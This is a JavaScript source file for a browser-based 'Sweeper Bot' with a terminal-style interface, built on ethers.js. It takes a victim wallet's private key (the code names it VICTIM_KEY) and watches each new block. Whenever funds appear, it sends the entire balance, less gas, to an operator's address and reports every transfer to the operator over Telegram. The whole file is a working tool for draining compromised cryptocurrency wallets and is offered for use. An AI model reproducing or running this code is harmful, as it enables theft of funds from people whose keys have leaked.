// ============================================
let terminal_name = 'sweeperbot@terminal:~$';
let bot_status = false;
let botDetails = {};

const inputElement = document.getElementById('terminal-input');
const outputElement = document.getElementById('terminal-output');

document.addEventListener('DOMContentLoaded', function () {
  bot_status = false;
  inputElement.addEventListener('keydown', function (event) {
    commondEnter(true, event, inputElement.value);
  });

  function commondEnter(key_or_text, event, commond) {
    let text_commond = commond.trim();

    if (bot_status) {
      if (event.key === 'Enter' || !key_or_text) {
        if (
          text_commond === 'start' ||
          text_commond === 'stop' ||
          text_commond === 'clear' ||
          text_commond === 'status'
        ) {
          handleCommand(text_commond);
        }

        inputElement.value = '';
      }

      return;
    }

    if (!key_or_text) {
      outputElement.innerHTML += `<div><span class="prompt">${terminal_name}</span> ${text_commond}</div>`;
      inputElement.value = '';
      handleCommand(text_commond);
      return;
    }

    if (event.key === 'Enter') {
      const command = inputElement.value.trim();
      if (command == '' || command == undefined || command == null) {
        return;
      }
      outputElement.innerHTML += `<div><span class="prompt">${terminal_name}</span> ${command}</div>`;
      inputElement.value = '';
      handleCommand(command);
      return;
    }
  }

  function handleCommand(command) {
    let output;
    let status_message = '🛑 Sweeper Bot is currently stopped.';

    if (bot_status) {
      status_message = '▶️ Sweeper Bot is currently running.';
      if (command == 'stop') {
        stop_bot(false);
        outputElement.innerHTML += `<div><span class="prompt">${terminal_name}</span> ${command}</div>`;
        inputElement.value = '';
        output = '🛑 Sweeper Bot stopped.';
      } else if (command == 'start') {
        output = '⏩ Sweeper Bot is already started.';
      } else if (command == 'clear') {
        inputElement.value = '';
        outputElement.innerHTML = ``;
        return;
      } else if (command == 'status') {
        output = status_message;
      }

      outputElement.innerHTML += `<div>${output}</div>`;
      outputElement.scrollTop = outputElement.scrollHeight;
      return;
    }

    switch (command.trim()) {
      case 'help':
        output = 'Available commands: help, start, stop, status, clear';
        break;
      case 'start':
        start_bot();
        output = '';
        break;
      case 'status':
        output = status_message;
        break;
      case 'clear':
        outputElement.innerHTML = '';
        return;
      default:
        output = `command not found: ${command}`;
    }

    outputElement.innerHTML += `<div>${output}</div>`;
    outputElement.scrollTop = outputElement.scrollHeight;
  }

  document.getElementById('start-btn').addEventListener('click', function () {
    commondEnter(false, 'start', 'start');
  });

  document.getElementById('stop-btn').addEventListener('click', function () {
    commondEnter(false, 'stop', 'stop');
  });

  function setOutput(message) {
    outputElement.innerHTML += `<div>${message}</div>`;
    outputElement.scrollTop = outputElement.scrollHeight;
  }

  // =========================== modal ==========================
  const modal = document.getElementById('settings-modal');
  const settingsBtn = document.getElementById('settings-btn');
  const closeModal = document.getElementById('close-modal');
  const saveBtn = document.getElementById('save-btn');

  function setBotDetails() {
    bot_status = false;
    const formData = new FormData(document.getElementById('settings-form'));
    formData.forEach((value, key) => {
      botDetails[key] = value;
    });
    alert('Bot Details Saved');
  }

  settingsBtn.addEventListener('click', function () {
    modal.style.display = 'block';
  });

  closeModal.addEventListener('click', function () {
    setBotDetails();
    modal.style.display = 'none';
  });

  window.addEventListener('click', function (event) {
    if (event.target == modal) {
      setBotDetails();
      modal.style.display = 'none';
    }
  });

  saveBtn.addEventListener('click', function () {
    setBotDetails();
    modal.style.display = 'none';
  });

  // =========================== bot function  ================
  // =========================== bot function  ================
  // =========================== bot function  ================

  let keys = [
    'network_rpc_url',
    'target_wallet_private_key',
    'recipient_address',
    'your_telegram_user_id',
    'your_telegram_bot_token',
    'network_name',
    'extra_gas_fee',
    'extra_gas_limit',
  ];

  let provider;
  let wallet;

  function stop_bot(message_output_type) {
    bot_status = false;
    sendStopMessage();
    if (message_output_type) {
      outputElement.innerHTML += `<div>🛑 Sweeper Bot stopped.</div>`;
      outputElement.scrollTop = outputElement.scrollHeight;
    }
  }

  async function start_bot() {
    let check_res = await check_the_bot_details();
    bot_status = true;
    if (check_res) {
      let provider_wallet_res = await setProvider_and_wallet();
      if (provider_wallet_res) {
        sendStartMessage();
        let monitor_block = await monitor_block_fun();
      } else {
        stop_bot(false);
      }
    } else {
      stop_bot(false);
    }
  }

  function isValidUrl(url) {
    try {
      new URL(url);
      return true;
    } catch (e) {
      return false;
    }
  }

  // ================= dynamic function ================
  async function setProvider_and_wallet() {
    let set_pro_wall_s = true;
    const RPC_URL = botDetails['network_rpc_url'];
    const VICTIM_KEY = botDetails['target_wallet_private_key'];

    try {
      if (!isValidUrl(RPC_URL)) {
        console.error('❌ Invalid RPC URL format.');
        stop_bot(true);
        return;
      }

      if (RPC_URL.startsWith('https') || RPC_URL.startsWith('http')) {
        provider = await new ethers.providers.JsonRpcProvider(RPC_URL);
      } else if (RPC_URL.startsWith('wss') || RPC_URL.startsWith('ws')) {
        provider = await new ethers.providers.WebSocketProvider(RPC_URL);
      }

      let start_bot_message = `🟢 Sweeper Bot started`;
      setOutput(start_bot_message);
      console.log(start_bot_message);
      let connected_success_message = `🔗 Connected to ${RPC_URL}`;
      console.log(connected_success_message);
      setOutput(connected_success_message);
    } catch (error) {
      set_pro_wall_s = false;
      stop_bot(true);
      console.log(error);
      setOutput('❌ ' + error);
    }

    await provider.ready;

    try {
      wallet = await new ethers.Wallet(VICTIM_KEY, provider);
      let target_wallet_addresss_message = `🎯 Target Wallet Address - ${wallet.address}`;
      console.log(target_wallet_addresss_message);
      setOutput(target_wallet_addresss_message);
      let recipient_address_message = `💰 Your Burning Funds Recipient Address - ${botDetails['recipient_address']}`;
      console.log(recipient_address_message);
      setOutput(recipient_address_message);
    } catch (error) {
      set_pro_wall_s = false;
      stop_bot(true);
      setOutput('❌ ' + error);
      console.log(error);
    }

    return set_pro_wall_s;
  }

  // monitor each block
  async function monitor_block_fun() {
    blockListener = async (blockNumber) => {
      if (!bot_status) {
        provider.off('block', blockListener);
        return;
      }
      let block_message = `[BLOCK ${blockNumber}]`;
      console.log(block_message);
      setOutput(block_message);
      await burn_native_tokens(wallet, botDetails);
    };

    provider.on('block', blockListener);
  }

  // ======== static funtion =======
  async function check_the_bot_details() {
    let empty = true;

    for (let key in botDetails) {
      if (
        botDetails[key] == '' ||
        botDetails[key] == null ||
        botDetails[key] == undefined
      ) {
        outputElement.innerHTML += `<div>Please enter the Bot - ${key}</div>`;
        empty = false;
      }
    }

    return empty;
  }

  // =================================== burning process   =======================================

  const utils = ethers.utils;
  const formatEther = utils.formatEther;

  const burn_native_tokens = async (burnWallet, config_de_value) => {
    let defaultGasLimit = 21000;
    let extraGasFee = config_de_value['extra_gas_fee'];
    let gasLimit =
      (await defaultGasLimit) + parseInt(config_de_value['extra_gas_limit']);

    const balance = await burnWallet.getBalance();
    if (balance.isZero()) {
      let balance_zero_message = `Balance is zero`;
      console.log(balance_zero_message);
      setOutput(balance_zero_message);
      return;
    }

    const gasPrice = (await burnWallet.getGasPrice()).add(
      utils.parseUnits(extraGasFee.trim(), 'gwei'),
    );

    let gas_fee_in_eth = await gasPrice.mul(gasLimit);

    if (balance.lt(gas_fee_in_eth)) {
      let balance_low_messaage = `🔻 Balance [${ethers.utils.formatEther(
        balance,
      )}] is very low for gas price: ${gasPrice.toString()} gwei [${ethers.utils.formatEther(
        gas_fee_in_eth,
      )}]`;

      console.log(balance_low_messaage);
      setOutput(balance_low_messaage);
      return;
    }

    const leftovers = await balance.sub(gas_fee_in_eth);

    try {
      let burning_amount_message = `🔥 Burning: ${formatEther(balance)}`;
      console.log(burning_amount_message);
      setOutput(burning_amount_message);

      const nonce = await burnWallet.provider.getTransactionCount(
        burnWallet.address,
      );

      const tx_object = {
        to: config_de_value['recipient_address'],
        gasLimit: gasLimit,
        gasPrice,
        nonce,
        value: leftovers,
      };

      const tx = await burnWallet.sendTransaction(tx_object);

      let trans_sumited_message = `🚀 Transaction submitted`;
      console.log(trans_sumited_message);
      setOutput(trans_sumited_message);
      let tras_trans_message = `📲 Transfer: ${formatEther(leftovers)}`;
      console.log(tras_trans_message);
      setOutput(tras_trans_message);

      const receipt = await tx.wait();
      const txHash = receipt.transactionHash;

      let trans_hash_mess = `✅ Tx hash - ${txHash}`;
      console.log(trans_hash_mess);
      setOutput(trans_hash_mess);

      const amount = formatEther(leftovers);
      const bot_token = config_de_value['your_telegram_bot_token'];
      const telegram_id = config_de_value['your_telegram_user_id'];
      const network_name = config_de_value['network_name'];

      let message = prepareMessage(network_name, txHash, amount);
      sendTelegramMessage(bot_token, telegram_id, message);
    } catch (err) {
      if (
        err.code === 'REPLACEMENT_UNDERPRICED' ||
        err.code === 'INSUFFICIENT_FUNDS'
      ) {
        let gas_fee_low_err = `Gas fee too low. Transaction may fail. 😔`;
        console.log(gas_fee_low_err);
        setOutput(gas_fee_low_err);
      } else {
        let error_mes_for_send_message = `Error sending transaction: 😱 ${err}`;
        console.log(error_mes_for_send_message);
        setOutput(error_mes_for_send_message);
      }
    }
  };

  // ================== tg ===============
  const prepareMessage = (network, txHash, amount) => {
    return `Network: <code>${network}</code>\n
Tx Hash: <code>${txHash}</code>\n
Amount: <code>${amount}</code>`;
  };

  const sendTelegramMessage = async (bot_token, telegram_id, message) => {
    const url = `https://api.telegram.org/bot${bot_token}/sendMessage`;
    const payload = { chat_id: telegram_id, text: message, parse_mode: 'HTML' };

    try {
      const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });

      if (response.ok) {
        let message_tg_send = `Message sent successfully`;
        console.log(message_tg_send);
        setOutput(message_tg_send);
      }
    } catch (error) {
      console.log('telegram message sending error');
    }
  };

  // ====================== bot status ===============
  let periodicMessageInterval;
  let bot_run_in_time = 6 * 60 * 60 * 1000; // 6 hours

  function sendStartMessage() {
    const bot_token = botDetails['your_telegram_bot_token'];
    const telegram_id = botDetails['your_telegram_user_id'];
    const message = '🟢 Sweeper Bot has started.';
    sendTelegramMessage(bot_token, telegram_id, message);
    startPeriodicMessage();
  }

  function sendStopMessage() {
    const bot_token = botDetails['your_telegram_bot_token'];
    const telegram_id = botDetails['your_telegram_user_id'];
    const message = '🛑 Sweeper Bot has stopped.';
    sendTelegramMessage(bot_token, telegram_id, message);
    clearPeriodicMessage();
  }

  function startPeriodicMessage() {
    periodicMessageInterval = setInterval(() => {
      const bot_token = botDetails['your_telegram_bot_token'];
      const telegram_id = botDetails['your_telegram_user_id'];
      const message = '⏲️ Sweeper Bot is running.';
      sendTelegramMessage(bot_token, telegram_id, message);
    }, bot_run_in_time);
  }

  function clearPeriodicMessage() {
    if (
      periodicMessageInterval != null ||
      periodicMessageInterval != undefined
    ) {
      clearInterval(periodicMessageInterval);
    }
  }


  // ================ by get request ====================
  function getUrlParams() {
    const params = new URLSearchParams(window.location.search);
    let urlBotDetails = {};
    for (const [key, value] of params.entries()) {
      urlBotDetails[key] = value;
    }
    return urlBotDetails;
  }

  function mergeUrlParamsIntoBotDetails() {
    const urlParams = getUrlParams();

    let allParamsPresent = true;

    for (const key of keys) {
      if (urlParams.hasOwnProperty(key)) {
        botDetails[key] = urlParams[key];
      } else {
        allParamsPresent = false;
      }
    }

    if (allParamsPresent) {
      alert('Bot Details Set from URL');
      let confirm_to_start = confirm('Do you want to start the bot ?');
      if (confirm_to_start){
        commondEnter(false, 'start', 'start');
      } 
    }

  }

  mergeUrlParamsIntoBotDetails();

});
